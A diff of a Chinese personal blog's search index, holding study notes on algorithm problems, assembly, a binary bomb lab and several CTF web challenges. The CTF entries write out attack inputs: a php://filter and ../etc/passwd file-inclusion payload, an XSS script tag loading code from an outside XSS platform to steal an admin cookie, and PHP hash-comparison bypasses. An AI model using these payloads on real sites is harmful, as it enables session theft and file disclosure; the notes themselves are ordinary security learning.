src="https://img-blog.csdnimg.cn/20210427165045875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""><br>题解：这道题主要就是运用了动态规划的思想。<br>它的核心思路就是设立dp[ ]数组，来记录如果截止到nums数组里的各元素i时，在nums[0]到nums[i]这一段区域里连续子数组的最大和。(⚠️，这里是指这一段区域一定以元素i为最后一个)<br>即，dp[3]，存储的就是nums数组里0-3这一块区域里连续子数组的最大和，也就是4自己一个数组，其和为4.</p><p>计算dp数组里的值的具体方法思路如下所示：</p><p>dp[0]的值也就是第一个数的值；<br>dp[1]=max（dp[0],0）+nums[1];</p><p>同理<br>Dp[I]=max(dp[i-1],0)+nums[i];</p><p>在计算dp数组的数值时，时刻进行比较，选出dp数组里最大的那一个，就是我们需要的最大值啦，是不是很简单呢。</p><h2 id="5-数组-简单-两数之和"><a href="#5-数组-简单-两数之和" class="headerlink" title="5.数组-简单-两数之和"></a>5.数组-简单-两数之和</h2><p><img src="https://img-blog.csdnimg.cn/20210427165208707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""><br>这个题解的关键就在于应用HashMap。map的key指的数值，value指的该数值在传入里数组排第几（即数组下标）<br>解题的主要思路，就是在map数组里面查看是否有key，其值等于targer减去nums[i]，如果有的话，就反回其value和i，也就是两个数的数组下标。<br>然后就解决啦！</p><h2 id="6-数组-简单-移动零"><a href="#6-数组-简单-移动零" class="headerlink" title="6.数组-简单-移动零"></a>6.数组-简单-移动零</h2><p><img src="https://img-blog.csdnimg.cn/20210427165307280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""><br><strong>比较简单的一个解题思路</strong>：设立两个指针，一个j，在初始数组str1里面进行循环，一旦发现不是0的数，就放到另一个数组array里面。然后指针j定格到所有非0数字的最后一个，也就是得到了所有非0数据的个数。<br>然后将str1剩余个数都设置为0就可以了。</p><p><strong>另外一个解题思路，主要就是借鉴的快速排序的思路</strong>。<br>同样设置两个指针i，j，如果i当前值是等于零的，那么j不动，i++；<br>如果i当前值不等于零，那么i，j进行交换，j++，i++；<br>本质就是要保证j左边的数都是非零的。</p><p>本质是一个循环不变量：在每一次循环前，j 的左边全部都是不等于0的</p><ul><li>起始j为0，明显满足</li><li>此后每一次循环中，若nums[i] = 0，则j保持不变，满足；若nums[i] != 0，交换后j增一，仍然满足</li></ul>]]></content>
     
     
+    <categories>
+      
+      <category>数组</category>
+      
+    </categories>
+    
     
     <tags>
       
@@ -157,6 +227,18 @@
     <content type="html"><![CDATA[<p>今日刚看完汇编语言的第四章，就觉得自己又可以了，兴冲冲想去做个题试试。结果直接垮掉，没拿到flag（宽面条泪），梁静茹给的勇气不靠谱啊！<br>罢了，虽然失败，还是说说主要的解题过程吧（不然也没啥好讲的）。首先下载文件，ida查看代码。然后分析漏洞，利用漏洞写出exp，最常用的是用到python的pwntools。最后使用nc或者pwntools连接到虚拟场景实现漏洞攻击得到flag。另外贴一些解题过程中用到的好文链接<br>关于栈溢出基础，这篇文章讲的真的超超超详细，相当感动了。附链接：<a href="https://bbs.ichunqiu.com/thread-42241-1-1.html" target="_blank" rel="noopener">栈溢出基础</a><br>栈溢出常用解题套路：<a href="https://www.cnblogs.com/-hack-/p/12105748.html" target="_blank" rel="noopener">栈溢出解题类型</a><br>常用解题套路：<a href="https://bbs.pediy.com/thread-251000.htm" target="_blank" rel="noopener">我是套路</a><br>另外，发一下mac10.15可以用的IDA pro下载链接吧：<a href="https://download.csdn.net/download/m0_38076563/12338665?utm_medium=distribute.pc_relevant_t0.none-task-download-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant_t0.none-task-download-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">下载链接</a><br>附加两篇ida使用说明：<a href="https://blog.csdn.net/john_david_/article/details/102822253" target="_blank" rel="noopener">使用说明1</a>、<a href="https://www.52pojie.cn/thread-1142065-1-1.html" target="_blank" rel="noopener">使用说明2</a></p>]]></content>
     
     
+    <categories>
+      
+      <category>pwn</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>二进制安全</tag>
+      
+    </tags>
     
   </entry>
   
@@ -170,6 +252,18 @@
     <content type="html"><![CDATA[<p>深感自己汇编学的不扎实，要花很多时间才能去掌握稍微复杂些的程序的思路结构。但要学的内容又总和汇编打交道。故决定用王爽老师的汇编语言一书重新再学习遍，网盘链接如下：<a href="https://pan.baidu.com/s/11eMlmBux_WZWIX4gEYYjew" target="_blank" rel="noopener">https://pan.baidu.com/s/11eMlmBux_WZWIX4gEYYjew</a> 提取码：07Z6<br>今日只把前三章最基础的部分看了一遍，这本书的确写得深入浅出，点赞，明天要继续努力拜读。另外，希望表妹们明天考试一定一定一定要顺顺利利的啊，保佑保佑🙏</p>]]></content>
     
     
+    <categories>
+      
+      <category>pwn</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>二进制安全</tag>
+      
+    </tags>
     
   </entry>
   
@@ -240,6 +334,18 @@
     <content type="html"><![CDATA[<h2 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a>第三阶段</h2><p><img src="https://img-blog.csdnimg.cn/20200323231741610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt=""><br>跳转查询地址<br><img src="https://img-blog.csdnimg.cn/20200323232331581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt=""><br><img src="https://img-blog.csdnimg.cn/20200323231804880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt=""><br><img src="https://img-blog.csdnimg.cn/2020032323182238.png" srcset="/img/loading.gif" alt=""><br>第三阶段首先找到输入格式是“%d %c %d”，输入的第一个数需要保证在2-7之间，并根据输入的这个数来进行跳转。然后需要保证输入的第三个数字等于0x38b即907，并进一步跳转，判断第二次输入的字符和al寄存器所存是否相等，相等即通关。最后结果是”3 l 907”</p><h2 id="第四阶段"><a href="#第四阶段" class="headerlink" title="第四阶段"></a>第四阶段</h2><p><img src="https://img-blog.csdnimg.cn/20200323232431851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt=""><br><img src="https://img-blog.csdnimg.cn/20200323232448500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt=""><br>第四阶段最关键的递归调用程序我还有点迷糊，只看出来了如果第二个数是4，第一个数就是4的倍数，然后试出来的48和4。</p><h2 id="第五阶段"><a href="#第五阶段" class="headerlink" title="第五阶段"></a>第五阶段</h2><p><img src="https://img-blog.csdnimg.cn/20200323232835858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt=""><br>第五阶段就是首先知道输入字符串的长度需要为6，然后进行一个循环，由ax寄存器的值当作循环变量，每次循环依次将输入的单个字符的ascII码的低四位存到cx寄存器中，并把0x804a260+4<em>ecx里存的数值累次加到dx寄存器上。六次循环后判断dx里的值是否为52，如果相等则通关。<br>52=10+10+10+10+10+2，当ecx里的值为0，0x804a260+4</em>ecx即0x804a260里存的是2，当ecx里的值为1时，0x804a264里存的是10，所以就找二进制低四位为0000和0001的字符，找到q和p符合条件。最后结果为qqqqqp</p>]]></content>
     
     
+    <categories>
+      
+      <category>拆弹</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>二进制安全</tag>
+      
+    </tags>
     
   </entry>
   
@@ -253,6 +359,18 @@
     <content type="html"><![CDATA[<p><img src="https://img-blog.csdnimg.cn/20200321215122818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt=""><br>第一阶段是将输入的内容和0x804a1c4存的内容相比较，相等则可以通过。<br><img src="https://img-blog.csdnimg.cn/20200321215449529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt=""><br>第二阶段要求输入六个数字，并且输入的第一个数字必须为1。整个程序经历五次循环，将循环变量从1开始相加，或者说做乘2运算（eax+eax），每次循环都要和相应次序输入的数字进行比较，必须保证都相等才能避免爆炸。</p>]]></content>
     
     
+    <categories>
+      
+      <category>拆弹</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>二进制安全</tag>
+      
+    </tags>
     
   </entry>
   
@@ -266,6 +384,18 @@
     <content type="html"><![CDATA[<p>装了一天的linux虚拟机，疲于修改各种奇奇怪怪的小bug。现在就有两个感悟：1.删除重装大法好，菜鸡必备。2.你永远不知道之前嫌弃占空间删掉的软件什么时候会再下回来，能留着就留着吧，重新下怪麻烦的。<br>简单说下安装过程吧，我用的virtualbox+ubuntu（用vb其实是因为穷，免费使用它不香吗？)<br>具体安装过程可见：<a href="https://www.jianshu.com/p/e838cd947eff" target="_blank" rel="noopener">虚拟机安装过程</a><br>设置共享文件夹可能会有点问题，自动挂载行不通的话还是莫要强求了，直接用手动挂载吧。具体方法可见<a href="https://www.jianshu.com/p/39327c9ea368" target="_blank" rel="noopener">共享文件夹的几种设置方法</a><br>全都装完后想执行一下bomb，结果？？？一直提醒我没有那个文件或目录。整了好久才知道是因为我的ubuntu是64位的，没有32位的运行库。在终端安装一下运行库就行，具体如下：</p><pre><code class="python">sudo apt-get install ia32-libs</code></pre><p>如果不行，说没有可用的软件包，然而下列软件包会取代它，就输入：</p><pre><code class="python">sudo apt-get install lib32z1</code></pre><p>另外，找到了一篇讲linux执行可执行文件的具体过程，讲的挺好：<a href="https://blog.csdn.net/mazongshan1/article/details/37936971?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">linux可执行文件执行过程</a><br>万事大吉后用objdump反汇编了一下bomb，整整齐齐蹦出来的汇编语言直接闪瞎了我的狗眼，明天开始要好好复习一下汇编语言了啊！</p>]]></content>
     
     
+    <categories>
+      
+      <category>拆弹</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>二进制安全</tag>
+      
+    </tags>
     
   </entry>
   
@@ -279,6 +409,18 @@
     <content type="html"><![CDATA[<h2 id="题目考查点"><a href="#题目考查点" class="headerlink" title="题目考查点"></a>题目考查点</h2><p>1.php文件包含漏洞<br>2.使用php://filter绕过限制</p><h2 id="涉及知识点"><a href="#涉及知识点" class="headerlink" title="涉及知识点"></a>涉及知识点</h2><p>1.php文件包含漏洞指服务器通过php的特性去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，导致执行了非预期的代码，从而产生安全漏洞。文件包含漏洞的一般特征如下：<br>?page=a.php<br>?home=a.html<br>?file=content<br>具体可见：<br><a href="https://blog.csdn.net/SKI_12/article/details/60882602?fps=1&locationNum=2" target="_blank" rel="noopener">php文件包含漏洞</a><br><a href="https://www.jianshu.com/p/3dc97deec491" target="_blank" rel="noopener">文件包含漏洞的几种利用方法</a><br><a href="https://blog.csdn.net/xysoul/article/details/46689049" target="_blank" rel="noopener">文件包含漏洞详解</a><br>2.使用php封装协议读取文件，一般可以使用两种方式：</p><pre><code class="python">?page=php://filter/read=convert.base64-encode/resource=index.php</code></pre><pre><code class="python">?page=../../../../../../etc/passwd</code></pre><p>3.php://filter是php中特有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取。其中，resource参数指定了要过滤的数据流，read或者write参数都可以设定一个或多个过滤器，以符号|分隔。其主要应用包括利用base64获得源码或者通过读写编码实行绕过操作等，本题就是利用它将引发冲突的文件流进行编码处理。<br>具体可见：<br><a href="https://blog.csdn.net/wy_97/article/details/77432002" target="_blank" rel="noopener">浅述filter妙用</a></p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>1.在url后面输入<br><code>?page=php://filter/read=convert.base64-encode/resource=flag</code>，先将可能引发限制的php代码用base64编码，从而绕过限制。<br>2.将页面出现内容进行base64解码，得到flag。</p>]]></content>
     
     
+    <categories>
+      
+      <category>pwn</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>二进制安全</tag>
+      
+    </tags>
     
   </entry>
   
@@ -292,6 +434,18 @@
     <content type="html"><![CDATA[<h2 id="题目考查点"><a href="#题目考查点" class="headerlink" title="题目考查点"></a>题目考查点</h2><p>1.Proof of work概念<br>2.Xss注入操作<br>3.修改cookie操作</p><h2 id="涉及知识点"><a href="#涉及知识点" class="headerlink" title="涉及知识点"></a>涉及知识点</h2><p>1.proof of work,即工作量证明。简单理解就是一份证明，来确认你做过一定量的工作。或者说，只有针对某个协议或者函数进行一定量的运算得出结果，才可以取得证明。其核心特征是不对称性：工作对于请求方是适中的，对于验证方则是易于验证的。详细介绍可见<a href="https://blog.csdn.net/lucky_greenegg/article/details/52530570" target="_blank" rel="noopener">pow介绍</a><br>2.XSS即跨站脚本攻击，利用对输入数据过滤的不严格，导致程序执行了用户在页面中输入的恶意代码，合法用户在之后访问的时候，这些恶意代码会被执行。<br>详细介绍可见：<br><a href="https://blog.csdn.net/weixin_43843847/article/details/89353390?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">XSS入门</a><br><a href="https://blog.csdn.net/sdb5858874/article/details/87913903?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">XSS进阶教程</a><br>3.XSS平台：在xss平台上创建项目后，在网站有xss的地方插入项目中的代码，执行的时候就会把相应的信息发送到xss平台上，可以用来查看cookie、账号等信息。详细介绍可见：<a href="https://www.zhihu.com/question/26964939" target="_blank" rel="noopener">xss平台作用</a></p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>1.home页面有留言板和<code>substr(md5(‘proof of work’),0,6)===’sdsaw1’</code>的字样，留言板应该是输入xss代码的地方，后一句代码的意思是找到某个字符串经md5编码后的前六个字符和sdsaw1保证强相等。同时，admin页面上提示需要使用管理员的cookie，所以获得管理员的cookie是关键。<br>2.根据pow的概念，直接用暴力枚举的方法找到符合条件的数字字符串。提交后出现同时在xss平台上创建项目，将项目中提示的代码<code>&lt;sCRiPtsRC=http://xss.fbisb.com/TMVX&gt;&lt;/sCrIpT&gt;</code>复制到留言板中。提交后显示如下‘your message has been in the queue of admin readlist’，也就说明了管理员方已经执行了xss代码，cookie等相关信息应该已经发送到了xss平台上。在平台上接收到的cookie内容为<code>cookie:token=a9011a0e551f181c1c526881befac44d</code><br>3.在admin页面打开chrome浏览器自带的开发者工具，修改cookie，刷新页面出现flag。</p>]]></content>
     
     
+    <categories>
+      
+      <category>pwn</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>二进制安全</tag>
+      
+    </tags>
     
   </entry>
   
@@ -305,6 +459,18 @@
     <content type="html"><![CDATA[<h2 id="题目考查点"><a href="#题目考查点" class="headerlink" title="题目考查点"></a>题目考查点</h2><p>1.php中stripos()函数、file_put_contents()函数应用<br>2.数组绕过方法</p><h2 id="涉及知识点"><a href="#涉及知识点" class="headerlink" title="涉及知识点"></a>涉及知识点</h2><p>1.PHP中stripos()函数用来查找字符串在另一字符串中第一次出现的位置，并不区分大小写。返回值为字符串第一次出现的位置，如果没有找到字符串返回false。详细介绍可见<a href="https://www.w3school.com.cn/php/func_string_stripos.asp" target="_blank" rel="noopener">stripos函数</a><br>2.file_put_contents()函数可用来把字符串、数组或者数据流写入文件中，返回值为写入到文件内数据的字节数。如果写入的是数组，会利用<code>join(‘’,$array)</code>转化为字符串。详细介绍可见<a href="https://www.w3school.com.cn/php/func_filesystem_file_put_contents.asp" target="_blank" rel="noopener">file_put_contents函数</a></p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>1.在初始界面随便输入一串数，进入一个新的界面。上面的php代码要求以get请求提交的content字符串中不应该包括’php’或者’&lt;’，如果满足了这个条件就会将content内容存到filename中。<br>2.输入满足条件的字符串，config.php页面中只会出现所输的内容。猜测需要在filename中存入’php’或者’&lt;’。遂尝试使用数组绕过的方法，在url后面添加<code>content[]=’php’</code>或者<code>content[]=’&lt;’</code>。此时config.php页面中出现flag。</p>]]></content>
     
     
+    <categories>
+      
+      <category>pwn</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>二进制安全</tag>
+      
+    </tags>
     
   </entry>
   
@@ -318,6 +484,18 @@
     <content type="html"><![CDATA[<h2 id="题目考查点"><a href="#题目考查点" class="headerlink" title="题目考查点"></a>题目考查点</h2><p>1.php类型比较<br>2.如何做到变量原值不同但利用md5或sha1编码后结果相同</p><h2 id="涉及知识点"><a href="#涉及知识点" class="headerlink" title="涉及知识点"></a>涉及知识点</h2><p>1.php变量比较包含松散比较和严格比较。其中，松散比较指使用两个等号比较，只比较值，不比较类型。严格比较指用三个等号比较，除了比较值，也比较类型。详情可见<a href="https://www.runoob.com/php/php-types-comparisons.html" target="_blank" rel="noopener">php入门之类型比较</a><br>2.php中sha1()函数计算字符串的SHA-1散列，md5()函数则计算字符串的MD5散列。<br>3.经过MD5运算后结果为0的字符串，编码后需保证0e<strong>**</strong>的形式，换成数字意思为0乘10的n次方，故结果为0。例如240610708 和 QNKCDZO均符合，实际上符合的字符串很多，就不一一赘述了。<br>4.保证变量不同但SHA-1编码后相同，利用数组绕过的方法。因为md5和sha1对一个数组进行加密都将返回NULL，而NULL===NULL返回true。还有一些php黑魔法可见以下链接：<br><a href="https://blog.csdn.net/nzjdsds/article/details/82019297" target="_blank" rel="noopener">ctf中php总结</a><br><a href="https://blog.csdn.net/weixin_30539835/article/details/99669583" target="_blank" rel="noopener">php常见考点</a><br><a href="https://www.cnblogs.com/xishaonian/p/7628152.html" target="_blank" rel="noopener">php黑魔法总结</a></p><h2 id="做题步骤"><a href="#做题步骤" class="headerlink" title="做题步骤"></a>做题步骤</h2><p>1.观察所给代码，使用get请求。并且只要同时满足<code>md5($test)==‘0’</code><br><code>sha1($_GET[[‘name’])===sha1($_GET[‘password’])</code><br>以上两个条件即可。<br>2.在url后部添加<code>test=240610708&amp;name[]=1&amp;password[]=2</code>,可得到flag信息。</p>]]></content>
     
     
+    <categories>
+      
+      <category>pwn</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>二进制安全</tag>
+      
+    </tags>
     
   </entry>
   
@@ -331,6 +509,18 @@
     <content type="html"><![CDATA[<h2 id="题目考查点"><a href="#题目考查点" class="headerlink" title="题目考查点"></a>题目考查点</h2><p>Sql手工注入   </p><h2 id="涉及知识点"><a href="#涉及知识点" class="headerlink" title="涉及知识点"></a>涉及知识点</h2><p>1.注入点寻找<br>2.判断字段长度<br>3.判断字段位置<br>4.查询数据库名、表名、表中的字段和字段信息 </p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>以下解题步骤主要参考了这两篇文章<a href="https://www.cnblogs.com/conquer-vv/p/11307682.html" target="_blank" rel="noopener">https://www.cnblogs.com/conquer-vv/p/11307682.html</a><br><a href="https://blog.csdn.net/qq_39353923/article/details/82901903" target="_blank" rel="noopener">https://blog.csdn.net/qq_39353923/article/details/82901903</a><br>说实话，我做这个题就是照着上面文章来的，搜sql手工注入结果找到了一个差不多的题，做出来这个题很是胜之不武，也没啥成就感。具体步骤如下：<br>1.找注入点，判断是否存在注入点常用套路是输入语句’、and 1=1或and 1=2,来判断网站是否存在注入点。尝试在正常数据后加上单引号，发现数据为空，加上注释符(注释符:#,–+ , //, – )后发现依旧可以正常输出,那么可以判断存在注入点。<br>2.用order by 来判断字段长度。<br>3.使用union或者union all将SQL语句联合起来判断字段位置，并可以查询数据库名、表名、表中的字段和字段信息。最终在字段信息中找到flag</p>]]></content>
     
     
+    <categories>
+      
+      <category>pwn</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>二进制安全</tag>
+      
+    </tags>
     
   </entry>
   
@@ -344,6 +534,18 @@
     <content type="html"><![CDATA[<h2 id="题目考查点"><a href="#题目考查点" class="headerlink" title="题目考查点"></a>题目考查点</h2><p>1.对session对象的应用，以保证会话信息的一致性。<br>2.如何正确解析和提取HTML／XML数据<br>3.base64正确解码方式<br>4.对SVG图像的处理 </p><h2 id="涉及知识点"><a href="#涉及知识点" class="headerlink" title="涉及知识点"></a>涉及知识点</h2><p>1.创建一个session对象来发请求，那么每次发请求用的都是这个会话对象，能够保存之前的会话信息，以保证会话信息的一致性。<br>2.BeautifulSoup支持Python标准库中的HTML解析器，借助它可以实现对html/xml语言的解析与提取，本题使用方法为BeautifulSoup(markup,”html.parser”)。具体标签内容的提取方法可参照 <a href="http://www.jsphp.net/python/show-24-214-1.html" target="_blank" rel="noopener">http://www.jsphp.net/python/show-24-214-1.html</a><br>3.SVG为可缩放矢量图形，并使用XML格式来定义图像。<text>元素用于定义文本，其中x决定此文本在横轴的位置，y决定纵轴的位置。具体介绍可见<a href="https://www.runoob.com/svg/svg-text.html" target="_blank" rel="noopener">https://www.runoob.com/svg/svg-text.html</a> </p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>1.首先查看网页源代码，观察到data:image/svg+xml;base64的字眼。<br>2.对img标签内描述图像的内容进行提取，并利用Base64解码。<br>3.解码得到svg描述的原图像，为了得到按图片从左到右顺序排序的字母序列，利用x的大小对标签内容进行排序。<br>4.得到验证码内容，利用get请求提交。</p>]]></content>
     
     
+    <categories>
+      
+      <category>pwn</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>二进制安全</tag>
+      
+    </tags>
     
   </entry>
   
@@ -357,6 +559,18 @@
     <content type="html"><![CDATA[<p>做了一天多终于搞出来了，有点沮丧，自己需要学的有好多好多好多好多啊。<br>讲讲题目的思路吧，题目要求快速计算出一串式子的结果。提示说思考服务器怎样知道获得算式和提交答案的是一个人，然而我还是没啥思路，好吧，起码大方向给了。就看了提示里的Python requests库，又查了查相关资料，发现直接使用requests调用请求方法发送请求，每次都会创建一个新session（会话对象），没有之前请求的cookies信息。直接创建一个session对象来发请求，那么每次发请求用的都是这个会话对象，所有能够保存之前的会话信息（cookies数据），就能够保证获得算式和提交答案的都是一个人了。session其实是一个会话类，requests的所有请求方法，底层都是调用的这个类的对象。看来是要用python来写啊，这样就有初步的解决思路了。<br>但是咋计算那串式子呢？首先肯定得从所有的字符串中提取出来，那就用正则表达式匹配试试吧，尴尬的是我正则表达式忘得差不多了，只能再查资料学习了。正则表达式中，+号表示前面的字符必须至少出现一次，*号表示字符可以不出现，也可以出现一次或者多次，？号表示前面的字符最多只可以出现一次。特殊字符需要在钱买呢加上一个\进行转义。python的re模块有全部的正则表达式功能，其中，re.match函数从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，就返回none。re.search则是扫描整个字符串并返回第一个成功的匹配。两者都可以用group(num)或者group()匹配对象函数来获取匹配表达式。 一开始写的表达式一直匹配的不对，看了看应该是空格匹配有些不太对，怎么整也没整好，就偷懒把所有空格都替换了，so sad。好不容易把式子匹配完，并用eavl函数计算出结果。此时的我犯了一个很蠢的错误，想用post请求来提交数据（想当然的脑回路不要有啊），一直不对。纠结了好久终于想起来再去看看网页源代码，扫了一眼，顿时虎躯一震，想捶死自己的心都有了，原来是要用get请求啊！python里requests模块的get方法有几个常用的参数，url-接口地址，headers-定制请求头，params-传递测试接口要用的参数，用python中的字典形式（key:value）来进行参数的传递，timeout-设置接口连接的最大时间，超过该时间会出现超时错误。本题只使用了url和params两个参数。慢慢修改后，最后终于整出来了。</p>]]></content>
     
     
+    <categories>
+      
+      <category>pwn</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>二进制安全</tag>
+      
+    </tags>
     
   </entry>
   
@@ -370,6 +584,18 @@
     <content type="html"><![CDATA[<p>@<a href="这里写自定义目录标题">TOC</a></p><h2 id="第一次记录"><a href="#第一次记录" class="headerlink" title="第一次记录"></a>第一次记录</h2><p>最简单的白给题-simple HTTP method，测试的get和post的用法。<br>第一个是关于get的题目，就我而言第一眼看到是懵逼的，以前完全没接触过这种骨骼清奇的题目。看了看网页的源代码，意识到这可能和get变量用法有关，只要想办法把key值设置成areyousure应该就行了。于是就去查相关用法。查了之后发现get传输的变量直接显示在URL之中，所以直接在网址后面加上？key=areyousure就可以了。?代表URL的结尾与请求参数的开始。<br>另一个是关于Post的题目，但是用post方法的表单发送的信息，对任何人都是不可见的，自然也不会直接显示在URL中。害，这可咋整。遂又在网上找处理方法，找到了一个在线http接口测试工具，把网址，参数key，参数值areyousure输入，得到了flag。<br>两个最简单的白给题做下来，不禁对自己的菜鸡水平有了更深层次的理解。还是要多努力啊！</p>]]></content>
     
     
+    <categories>
+      
+      <category>pwn</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>二进制安全</tag>
+      
+    </tags>
     
   </entry>
   
